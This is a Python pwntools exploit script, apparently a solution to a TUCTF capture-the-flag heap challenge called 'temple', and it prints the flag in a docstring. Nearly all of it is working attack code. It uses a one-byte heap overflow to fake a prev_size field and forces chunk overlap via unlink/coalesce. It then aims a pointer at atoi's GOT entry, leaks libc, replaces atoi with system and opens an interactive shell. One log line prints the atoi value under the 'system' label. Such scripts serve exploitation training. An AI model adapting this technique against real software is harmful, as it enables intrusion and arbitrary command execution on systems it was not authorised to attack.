from pwn import *
import sys

atoi_got = 0x603098
sys_off  = 0x45390
atoi_off = 0x36e80 

def alloc(size, data):
	r.sendlineafter('choice: ', '2')
	r.sendlineafter(': ', str(size))
	r.sendlineafter(': ', data)
	return

def free(idx):
	r.sendlineafter('choice: ', '1')
	r.sendlineafter(': ', str(idx))
	return

def edit(idx, data):
	r.sendlineafter('choice: ', '3')
	r.sendlineafter(': ', str(idx))
	r.sendlineafter(': ', data)
	return

def leak(idx):
	free(idx)
	return u64(r.recv(6).ljust(8, '\x00'))

def pwn():
	'''
	Flag: TUCTF{0n3_Byt3_0v3rwr1t3_Ac0lyt3}

		--==[[ Plan
		 	1. off-by-one overflow 
		 	2. chunk overlap via unlink/coalesce
		 	3. dataptr => atoi's GOT entry
		 	4. Leak libc
		 	5. atoi    => system 
	'''

	# chunks starts at index 8
	alloc(0x50,  'A'*8) # 8
	alloc(0x30,  'B'*8) # 9
	alloc(0x70,  'C'*8) # 10
	alloc(0x70,  'D'*8) # 11

	# 1 byte overflow => overwrite prev_size field
	edit(9, 'A'*(0x30) + p8(0xd0))
	# trigger unlink/coalesce
	free(10)
	# overlap chunks
	alloc(0xa0,  'F'*0x20 + p64(0x61) + p64(0x31) * 2 + p64(atoi_got) + p64(8) + p64(atoi_got)) 

	atoi   = leak(9)
	libc   = atoi - atoi_off
	system = libc + sys_off

	log.success("atoi:   0x{:x}".format(atoi))
	log.success("Libc:   0x{:x}".format(libc))
	log.success("system: 0x{:x}".format(atoi))

	# overwrite heap pointer with atoi's GOT entry
	edit(8, p64(9) + p64(atoi_got))
	# atoi => system
	edit(12, p64(system))

	r.sendline('sh')

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
    	r = process('./temple')
        pause()
        pwn()
